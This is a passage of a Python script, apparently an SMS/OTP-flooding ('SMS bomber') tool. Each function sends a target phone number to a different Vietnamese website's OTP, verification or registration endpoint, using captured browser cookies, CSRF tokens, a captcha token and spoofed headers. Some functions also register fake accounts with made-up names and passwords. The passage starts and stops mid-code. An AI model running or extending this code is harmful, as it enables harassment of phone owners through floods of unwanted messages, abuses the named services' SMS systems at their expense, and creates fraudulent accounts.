    'XSRF-TOKEN': 'eyJpdiI6IkpWWUVVUG5OcEc0VUNDZWEyTzhHK0E9PSIsInZhbHVlIjoiTUphRjUycGR0eEFtbzRVa29BdWJkeUw0ZkhJN0lYTjIxSXNxcWNvWUJibjRKS0FwVFNFeFdUaTVRaXlLdVNnU3ZFUUN6M0dsYjNvL1Nnc3RUV2t3U2JUSm5Tc1Q1a1VLODB6aDBNcDRYUzN2UWNyN09SRTFtYVV2TmhCeTZFQUIiLCJtYWMiOiI0ZGI5YWU1NjY5MTIxOTQwMTBlYjI3NjcyNzlhNTFiMjhlNjIzNTQ1MzkyOWUyMjljYThhYjI0YTc4YzU4YmViIiwidGFnIjoiIn0%3D',
    'bds123': 'fd12ZhmQfcOjeSuC2a1Mo4JWXaNwSHJZLD5OMRHr',
    '_ga_M7CCJGF805': 'GS1.1.1723171050.1.1.1723171087.0.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.1983671431.1723171050; _gat_gtag_UA_61644228_3=1; app_version=eyJpdiI6ImJ5TXV5bzVaeXVvbUwxSGZCcHpoZGc9PSIsInZhbHVlIjoiQ0lERnFYWjUvUS9kL1owdmQ0QStkZUZaQ1JmK015d3dUTGhYT2F6N0V2RWhNbERrZVgzMSs4SG9ya1ZxVWRRbyIsIm1hYyI6IjMyMDBlZjJhY2UyZDU5ZDc4ZWE1ZjVjNWYzMjI5NDA0NDM0YjE4Y2NjZDA0ZjgwYzAzNTU3NTkzOTlmODQzMDciLCJ0YWciOiIifQ%3D%3D; _ga=GA1.1.2086274722.1723171050; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUqAQHvuSb8GNaaYRM53jL4WkeTMqbYYbTBxSTzTB4pHItLNYzr8mn8fQ5IYq6ZklVdcbVnj6o0wwBXrjwcsMEseCC3CgEqjpLpktzwtrnvrurG2G%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723171052785%7D; XSRF-TOKEN=eyJpdiI6IkpWWUVVUG5OcEc0VUNDZWEyTzhHK0E9PSIsInZhbHVlIjoiTUphRjUycGR0eEFtbzRVa29BdWJkeUw0ZkhJN0lYTjIxSXNxcWNvWUJibjRKS0FwVFNFeFdUaTVRaXlLdVNnU3ZFUUN6M0dsYjNvL1Nnc3RUV2t3U2JUSm5Tc1Q1a1VLODB6aDBNcDRYUzN2UWNyN09SRTFtYVV2TmhCeTZFQUIiLCJtYWMiOiI0ZGI5YWU1NjY5MTIxOTQwMTBlYjI3NjcyNzlhNTFiMjhlNjIzNTQ1MzkyOWUyMjljYThhYjI0YTc4YzU4YmViIiwidGFnIjoiIn0%3D; bds123=fd12ZhmQfcOjeSuC2a1Mo4JWXaNwSHJZLD5OMRHr; _ga_M7CCJGF805=GS1.1.1723171050.1.1.1723171087.0.0.0',
    'origin': 'https://bds123.vn',
    'priority': 'u=1, i',
    'referer': 'https://bds123.vn/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9iZHMxMjMudm4vZGFzaGJvYXJkL2luZGV4Lmh0bWw=&f=r',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-csrf-token': 'DNonI666BRqnZ63ev71s16wE1TjCSRmttMcKzNeS',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'phone_or_email': phone,
    'action': 'verify',
}

   response = requests.post('https://bds123.vn/api/user/send-token', cookies=cookies, headers=headers, data=data)
def circa(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'vi-VN',
    'authorization': '',
    'content-type': 'application/json',
    'grpc-timeout': '30S',
    'origin': 'https://circa.vn',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
    'token': '03AFcWeA4nfAkyAHaOFFVulD1EVUjCG5sorAwykd6FZiMMkgsaYO_XX_ojm02woasr1MnVCMqJVhbe1ppgUwggW125b_jHirND4j3CgPupLbivZ9kaXTtmIiu_3_ZOy3454MZY6hvxBfHvHQ3R5YxyXtE31AXPzcYV0Iau01pg396KOXu_TJx5RaQTA2ScZ2hmUKintSg_Efhc0TYKspAYvTWvVFMKL53_vrXZmNH1eZTqCTn3igzzLEpsnE8nssWSgpZ0retI7krssDcwzKrTYs-3EpTujFFa5KvgSXyFIPKIXFRFfAitAw9vBTjNuDDqVvANMUNtw-4AHpMt2VKARuacZtq4lm5j2zZnYBUvFG_Cyy2xfH1EweXbUK3QzkJBifm5e4-bMJwJjmns_LcPQQfegdNayvwjzNkvK7xLLfLPy0DeiahaOUts7kXLaW34k0BPYsKbPBjBhj-Ccv00367QRfGUz_ef2J3vAG0OyaPVW9D3C8eGD-C4V-AFh3Mu9T1smPvVTaz_Iw_Yvbnz4uBzkxE0uFcBlxoF-UN9hVBT9X_NNYx8sSdg4KR38e1U6P7Lh1vQSsG0NMBs0CR-BfVhezkUBeknkhDkjZcE_rU9oTZ10yDS4QVA_gZHzYspBGZgOIRj5q7MN8w4tsDuGy23mxVMQ1eoEfNsMM5jjbISJo1Fikmyv82GIgWPi8BfORSyHfnel6tKg9GCfzI0BIoTs1nBk4ec_T15yUlsbK9xJNU9yfvb3ThTWL_FMDhrPaRkDrhtvLUxqOSuMS0LAmLgfjL10IoumCsACJv8uCktR9oGsf6N7DHYYRkPbsJXwUw1-gq5HBIuM1hvwMhsF_BnVF82ZrFCqO0UX2e-DH9B-qLpHPhP6PWaaTGb3kpz5B0NdUkwg4B3lQrt2pJfQUeVnjZQfCK2HZt6xZJOXGdBJv-_Qi3MydXbtO0At9zYguDsjCoesL2rn8FQuF5r-QoRfYpaYhdyvdBfSHk9haTQzgqQY0i5TPgh41lgVRtDgzQdr6VwAQSDr_6JxA71gIylX1o3OdbQFIrQxyR_LMadv8fI9YA55ioWXVxNGvigYTw1n8u57GY1PBYpEGDqHShWjNm64WDFKDo0_DOXX29bUJWcyN32rDZdd3sc962KEpHEq1_RMrKHRwlXfv-j_KhY1-gL-CSYohfU7XsM__oREN4uM2Q-_8mkp_o2coqnRWA180kKIREBiWXJgaAVveKZ0MMOKoeQvxvMTwikiW40gw5_c178KusbQXxJ9-Sac1S2vVhOF8QfnEnvKLxU7eyvLkfSHyPiLNPReF-3hAm30ccIBaoDjfjzKnrZwk11RxOLT3Z0loJq6xDiPc6iDaOEBDcixN1gc1T6H7l-TCwtoqD3k_dK0aXmiV2MpHHmRcP162YmzAU-1AnTZrZsGCt1-rVJybs6g3l7X0Ov3YJNrRpD32KFlin_GZLlk5YbV8u3csSl2w9B2QL25qAIwcUGPQdSBTBd0TM4E_y2eBw6K2kaBZ1rEfWCHV4AoUKpAwWXJ6m6Hp7c1150ZlfazR3PomUTlKaDKYJRIpKu7CAfgDYj9U56H0EjlYvgOOlU4ubHprmmGTPU-epJaiJ4IPDpidVLoZfZzSs-Fv6lEMkzx0fxQlBCKAG_Fo8QmI43INkKc9yJVsnmX-kATNPvV3UxdUTd61ZCZuzVEWAl4t8siDfMNj8oE9KtFnOPiMHqhyw0HUf5dr_jqLldcwd65XNlkwiGgpd6leQ4cs9PCkIgtQDzReRX2_wT9fUIAiDmmbyMfZEcLiI2P8R837Znr3GHImVKVryqhbY816iLYoWNSkWrhHtcsvblkYP5Zp7NvdK-a-sy0T_U87A7p1lRjEBgxA7piy6EALHDc49WV_pV7ADmFpLEswU',
}

   response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def ghnexp(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'priority': 'u=1, i',
    'referer': 'https://sso.ghn.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
   json_data = {
    'phone': '0987895305',
    'type': 'register',
}

   response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
def tiniworld(phone):
   cookies = {
    'connect.sid': 's%3AUKNK-rfteUt00wO2H4z6JfxxyGr4SYXe.Sc3%2FZ9DPQ0i6TMvbpPe6etBGSw8Daacyp1FqZCJZY6M',
}

   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'connect.sid=s%3AUKNK-rfteUt00wO2H4z6JfxxyGr4SYXe.Sc3%2FZ9DPQ0i6TMvbpPe6etBGSw8Daacyp1FqZCJZY6M',
    'origin': 'https://prod-tini-id.nkidworks.com',
    'priority': 'u=0, i',
    'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_csrf': '',
    'clientId': '609168b9f8d5275ea1e262d6',
    'redirectUrl': 'https://tiniworld.com',
    'phone': phone,
}

   response = requests.post('https://prod-tini-id.nkidworks.com/auth/tinizen', cookies=cookies, headers=headers, data=data)
def acheckin(phone):
   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'access-control-allow-origin': '*',
    'authorization': 'undefined',
    'content-type': 'application/json',
    'locale': 'vi-VN',
    'origin': 'https://hrm.acheckin.io',
    'priority': 'u=1, i',
    'referer': 'https://hrm.acheckin.io/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-workspace-host': 'hrm.acheckin.io',
}

   params = {
    'search': phone,
}

   response = requests.get(
    'https://api-gateway.acheckin.io/v1/external/auth/check-existed-account',
    params=params,
    headers=headers,
)
def pnj(phone):
   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': '_cdp_user_new; _atm_objs=eyJzb3VyY2UiOiJvcG1fbm91c2Ffc2hvcHBpbmdfYWRzIiwibWVkaXVtIjoiY3BjIiwiY2FtcGFp%0D%0AZ24iOiJwbWF4LWdvbGQiLCJjb250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJhc3NvY2lhdGVf%0D%0AdXRtIiwiY2hlY2tzdW0iOiIqIiwidGltZSI6MTcyMzExMTg5NDIwNH0%3D; _pk_ref.564990245.4a15=%5B%22pmax-gold%22%2C%22%22%2C1723111894%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990245.4a15=*; CDPI_VISITOR_ID=264b424c-578a-4265-ae0e-73e7f9c445b6; CDPI_RETURN=New; CDPI_SESSION_ID=1f30e4f5-9ecd-43a9-8f3c-136fd23973a8; _cdp_fsid=2263478188876597; _asm_visitor_type=n; au_id=1576926415; _ac_au_gt=1723111895585; _cdp_cfg=1; _gcl_au=1.1.263099741.1723111894; cdp_session=1; _asm_uid=1576926415; utm_notifications=%7B%22utm_source%22%3A%22opm_nousa_shopping_ads%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%22%22%2C%22utm_campaign%22%3A%22pmax-gold%22%2C%22aff_sid%22%3A%22%22%7D; _gid=GA1.3.2016393453.1723111895; _gat_UA-26000195-1=1; mp_version_change=4.3.4.2044; _tt_enable_cookie=1; _ttp=hdximspfCm-okdlIB3O4o3-fLf2; _clck=1s0w1yv%7C2%7Cfo5%7C0%7C1681; sid_customer_1f31a=493f941b60de3dc81fb410d2b9a7554f-C; _gac_UA-26000195-1=1.1723111896.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _ga_K1CDGBJEK0=GS1.1.1723111895.1.0.1723111897.0.0.0; _pk_id.564990245.4a15=1576926415.1723111894.1.1723111898.1723111894.; _gcl_aw=GCL.1723111898.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _gcl_gs=2.1.k1$i1723111897; _ga_3S12QVTD78=GS1.1.1723111894.1.1.1723111898.56.0.0; _ac_client_id=1576926415.1723111899; _asm_ss_view=%7B%22time%22%3A1723111894293%2C%22sid%22%3A%222263478188876597%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-08-08T10%3A11%3A38%22%2C%22duration%22%3A3835%7D; _ac_an_session=zhzhzlzgznzkzrzizrzrzrzkzlzmzqzkzdzizmzkzlzqzhzlznzizmzdzizkzhzgzizizizrzqzqzdzizdzizkzhzgzizizizrzqzqzdzizkzhzgzizizizrzqzqzdzizdzhzqzdzizd2f27zdzgzdzlzmzlznzizdzd3226z82q2524z835242725z82q242h2k; _ga=GA1.3.1212797956.1723111895; _ga_TN4J88TP5X=GS1.3.1723111895.1.1.1723111898.57.0.0; _clsk=1bm8lg6%7C1723111898553%7C2%7C1%7Cz.clarity.ms%2Fcollect; XSRF-TOKEN=eyJpdiI6ImlQZ25ERGdRK2hsQXU1cC9Ib3cxN3c9PSIsInZhbHVlIjoiNWl3aWZVNm0yTUFnVi9qYjIzNFg3aU1rK28veXVBcjYvSXoxbTMxbGYydHRSNGV5a2hMYnJNdk1zT3NDamZLMXc2cEthbFhMU3NmOFhtRjNiRElmR2tuczFJY3M4VURJV0l2ZWpqSkpQYmQ4VFpSUzJKOStMWERXQkloVWJuZGwiLCJtYWMiOiI4NDQwOTc5YWFkNGZmZmQ0YjJiMDFiOWE4ZDM0OGY1MGU1MzhhNzNjMWNkNjJmYjQ1ZWExZmUzZjhkNmZjMTMwIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6ImtPYWtRWWhiWnJzWXFTQUNkalFBNmc9PSIsInZhbHVlIjoiQ1REUlhCWWJnTmdiM0dneEpxeDZKbmJZUU9SU1NFRkpjM3QyVTc1RWMvSDI3TVRlamh3YnhMKzJRNUZJdlhmRzBHbHVmWC9nNE4wSk9lODRia3h2VEV2MUYzOVRIalZ6SWFacStCVEQxdlJYODl5V2hKa2VCaCtLVkY4dDNVNnYiLCJtYWMiOiJiYTc4YzY1YjFiM2Q2YTRlNzYzY2Q4YjhlMDlhNDgyYzdmMGQxNDRkNDFlZTM4NWZjNGU0NmI1NTYwOGEzZWM3IiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1723111894.1.1.1723111916.0.0.0',
    'origin': 'https://www.pnj.com.vn',
    'priority': 'u=0, i',
    'referer': 'https://www.pnj.com.vn/customer/login',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_method': 'POST',
    '_token': 'GJ88Vp9AuWodl7DpZqr4G8yVCY6JmQs43AvGHOaw',
    'type': 'sms',
    'phone': phone,
}
   headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': '_cdp_user_new; _atm_objs=eyJzb3VyY2UiOiJvcG1fbm91c2Ffc2hvcHBpbmdfYWRzIiwibWVkaXVtIjoiY3BjIiwiY2FtcGFp%0D%0AZ24iOiJwbWF4LWdvbGQiLCJjb250ZW50IjoiIiwidGVybSI6IiIsInR5cGUiOiJhc3NvY2lhdGVf%0D%0AdXRtIiwiY2hlY2tzdW0iOiIqIiwidGltZSI6MTcyMzExMTg5NDIwNH0%3D; _pk_ref.564990245.4a15=%5B%22pmax-gold%22%2C%22%22%2C1723111894%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990245.4a15=*; CDPI_VISITOR_ID=264b424c-578a-4265-ae0e-73e7f9c445b6; CDPI_RETURN=New; CDPI_SESSION_ID=1f30e4f5-9ecd-43a9-8f3c-136fd23973a8; _cdp_fsid=2263478188876597; _asm_visitor_type=n; au_id=1576926415; _ac_au_gt=1723111895585; _cdp_cfg=1; _gcl_au=1.1.263099741.1723111894; cdp_session=1; _asm_uid=1576926415; utm_notifications=%7B%22utm_source%22%3A%22opm_nousa_shopping_ads%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_content%22%3A%22%22%2C%22utm_campaign%22%3A%22pmax-gold%22%2C%22aff_sid%22%3A%22%22%7D; _gid=GA1.3.2016393453.1723111895; _gat_UA-26000195-1=1; mp_version_change=4.3.4.2044; _tt_enable_cookie=1; _ttp=hdximspfCm-okdlIB3O4o3-fLf2; _clck=1s0w1yv%7C2%7Cfo5%7C0%7C1681; sid_customer_1f31a=493f941b60de3dc81fb410d2b9a7554f-C; _gac_UA-26000195-1=1.1723111896.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _ga_K1CDGBJEK0=GS1.1.1723111895.1.0.1723111897.0.0.0; _pk_id.564990245.4a15=1576926415.1723111894.1.1723111898.1723111894.; _gcl_aw=GCL.1723111898.CjwKCAjw2dG1BhB4EiwA998cqH9UrhNb3v3mY6CCTprx6uvWZVeth2J_-cOPdltAn2NoHqAoivhahxoCU2UQAvD_BwE; _gcl_gs=2.1.k1$i1723111897; _ga_3S12QVTD78=GS1.1.1723111894.1.1.1723111898.56.0.0; _ac_client_id=1576926415.1723111899; _asm_ss_view=%7B%22time%22%3A1723111894293%2C%22sid%22%3A%222263478188876597%22%2C%22page_view_order%22%3A2%2C%22utime%22%3A%222024-08-08T10%3A11%3A38%22%2C%22duration%22%3A3835%7D; _ac_an_session=zhzhzlzgznzkzrzizrzrzrzkzlzmzqzkzdzizmzkzlzqzhzlznzizmzdzizkzhzgzizizizrzqzqzdzizdzizkzhzgzizizizrzqzqzdzizkzhzgzizizizrzqzqzdzizdzhzqzdzizd2f27zdzgzdzlzmzlznzizdzd3226z82q2524z835242725z82q242h2k; _ga=GA1.3.1212797956.1723111895; _ga_TN4J88TP5X=GS1.3.1723111895.1.1.1723111898.57.0.0; _clsk=1bm8lg6%7C1723111898553%7C2%7C1%7Cz.clarity.ms%2Fcollect; XSRF-TOKEN=eyJpdiI6ImlQZ25ERGdRK2hsQXU1cC9Ib3cxN3c9PSIsInZhbHVlIjoiNWl3aWZVNm0yTUFnVi9qYjIzNFg3aU1rK28veXVBcjYvSXoxbTMxbGYydHRSNGV5a2hMYnJNdk1zT3NDamZLMXc2cEthbFhMU3NmOFhtRjNiRElmR2tuczFJY3M4VURJV0l2ZWpqSkpQYmQ4VFpSUzJKOStMWERXQkloVWJuZGwiLCJtYWMiOiI4NDQwOTc5YWFkNGZmZmQ0YjJiMDFiOWE4ZDM0OGY1MGU1MzhhNzNjMWNkNjJmYjQ1ZWExZmUzZjhkNmZjMTMwIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6ImtPYWtRWWhiWnJzWXFTQUNkalFBNmc9PSIsInZhbHVlIjoiQ1REUlhCWWJnTmdiM0dneEpxeDZKbmJZUU9SU1NFRkpjM3QyVTc1RWMvSDI3TVRlamh3YnhMKzJRNUZJdlhmRzBHbHVmWC9nNE4wSk9lODRia3h2VEV2MUYzOVRIalZ6SWFacStCVEQxdlJYODl5V2hKa2VCaCtLVkY4dDNVNnYiLCJtYWMiOiJiYTc4YzY1YjFiM2Q2YTRlNzYzY2Q4YjhlMDlhNDgyYzdmMGQxNDRkNDFlZTM4NWZjNGU0NmI1NTYwOGEzZWM3IiwidGFnIjoiIn0%3D; _ga_FR6G8QLYZ1=GS1.1.1723111894.1.1.1723111916.0.0.0',
    'origin': 'https://www.pnj.com.vn',
    'priority': 'u=0, i',
    'referer': 'https://www.pnj.com.vn/customer/login',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   data = {
    '_method': 'POST',
    '_token': 'GJ88Vp9AuWodl7DpZqr4G8yVCY6JmQs43AvGHOaw',
    'type': 'zalo',
    'phone': phone,
}

   response = requests.post('https://www.pnj.com.vn/customer/otp/request', headers=headers, data=data)
def psc(phone):
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://account.pcspost.vn',
    'priority': 'u=1, i',
    'referer': 'https://account.pcspost.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   json_data = {
    'FullName': 'Nguyễn Bảo',
    'EmailOrPhoneNr': phone,
    'NewPassword': 'TheSmartCat2303_',
    'confirmPassword': 'TheSmartCat2303_',
    'StationCode': '89304',
    'Password': 'TheSmartCat2303_',
}
   headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'origin': 'https://account.pcspost.vn',
    'priority': 'u=1, i',
    'referer': 'https://account.pcspost.vn/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

   params = {
    'EmailOrPhone': phone,
}

   response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
def book365(phone):
   cookies = {
    'PHPSESSID': 'Z7DuIHCNDDfrN3O4LMI8dALGMahbZAoF',
    'BX_USER_ID': 'aecb2878240c52ad76918a710f4c6ff3',
    '_gid': 'GA1.2.1522497530.1723110894',
    '_gat_gtag_UA_163975392_1': '1',
    '_ga_SC10XS66T9': 'GS1.1.1723110894.1.1.1723110987.0.0.0',
    '_ga': 'GA1.1.607258667.1723110894',
}

   headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=Z7DuIHCNDDfrN3O4LMI8dALGMahbZAoF; BX_USER_ID=aecb2878240c52ad76918a710f4c6ff3; _gid=GA1.2.1522497530.1723110894; _gat_gtag_UA_163975392_1=1; _ga_SC10XS66T9=GS1.1.1723110894.1.1.1723110987.0.0.0; _ga=GA1.1.607258667.1723110894',
    'origin': 'https://book365.vn',
    'priority': 'u=1, i',
    'referer': 'https://book365.vn/san-sach-in/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   data = {
    'dangky_name': 'Nguyễn Bảo',
    'dangky_phone': phone,
    'dangky_pwd': 'TheSmartCat2303',
    'dangky_pwdCheck': 'TheSmartCat2303',
    'dangky_country': '0',
    'dangky_province': '0',
    'dangky_district': '0',
    'dangky_award': '0',
    'dangky_address': '',
    'dangky_email': 'asdokljasd@gmail.com',
}

   response = requests.post('https://book365.vn/ajax/dangky_taikhoan.php', cookies=cookies, headers=headers, data=data)
def tatcorp(phone):
   cookies = {
    'sid_customer_6c986': '31ffaec5d2e73191ac7e0584ff32c4f4-C',
    '_ga': 'GA1.1.832929186.1723110682',
    '__zi': '3000.SSZzejyD3Dy_X-YntquEmYQBf_p2003QPTUrzjqIGiXpn_2fcnD3WpR3ywYQ70g5ESgvgPmR38K_ph6g.1',
    '_ga_E7WDYSDL18': 'GS1.1.1723110681.1.1.1723110685.56.0.0',
}

   headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7,fr-FR;q=0.6,fr;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'sid_customer_6c986=31ffaec5d2e73191ac7e0584ff32c4f4-C; _ga=GA1.1.832929186.1723110682; __zi=3000.SSZzejyD3Dy_X-YntquEmYQBf_p2003QPTUrzjqIGiXpn_2fcnD3WpR3ywYQ70g5ESgvgPmR38K_ph6g.1; _ga_E7WDYSDL18=GS1.1.1723110681.1.1.1723110685.56.0.0',
    'origin': 'https://www.tatmart.com',
    'priority': 'u=1, i',
    'referer': 'https://www.tatmart.com/profiles-add/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

   params = {
    'dispatch': 'tat_commons.verifi_phone',
}

   data = {
    'phone': phone,
